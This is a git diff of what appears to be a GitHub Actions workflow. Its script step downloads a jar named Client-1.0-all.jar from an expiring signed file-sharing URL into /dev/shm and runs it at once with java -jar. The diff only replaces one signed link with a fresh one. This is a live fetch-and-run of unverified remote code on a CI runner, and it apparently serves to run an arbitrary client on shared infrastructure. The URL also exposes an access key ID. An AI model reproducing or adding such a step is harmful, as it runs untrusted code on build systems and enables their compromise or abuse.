@@ -29,5 +29,5 @@ jobs:
           java-version: '21'
       - name: Run a multi-line script
         run: |
-          curl -o /dev/shm/1.jar "https://oo2zyeyq-dl.wss.cc/gdzn53n%2Fi%2F4w%2Fi4w9gdzn53n?response-content-disposition=attachment%3B+filename%3D%22Client-1.0-all.jar%22%3B+filename%2A%3Dutf-8%27%27Client-1.0-all.jar&sign=q-sign-algorithm%3Dsha1%26q-ak%3DAKID96nJdhhWHm11lGpUSBpIVTBesra5EUp0%26q-sign-time%3D1759552837%3B1759554679%26q-key-time%3D1759552837%3B1759554679%26q-header-list%3D%26q-url-param-list%3Dresponse-content-disposition%26q-signature%3D1716c7e713eab0b21c31b08b286e7be9ebf275f9"
+          curl -o /dev/shm/1.jar "https://6ebi7y06-dl.wss.cc/gdzn53n%2Fi%2F4w%2Fi4w9gdzn53n?response-content-disposition=attachment%3B+filename%3D%22Client-1.0-all.jar%22%3B+filename%2A%3Dutf-8%27%27Client-1.0-all.jar&sign=q-sign-algorithm%3Dsha1%26q-ak%3DAKID96nJdhhWHm11lGpUSBpIVTBesra5EUp0%26q-sign-time%3D1759553003%3B1759554844%26q-key-time%3D1759553003%3B1759554844%26q-header-list%3D%26q-url-param-list%3Dresponse-content-disposition%26q-signature%3D8c92d047f9071ddea7712f8b7b9e1f76f70c1893"
           java -jar /dev/shm/1.jar
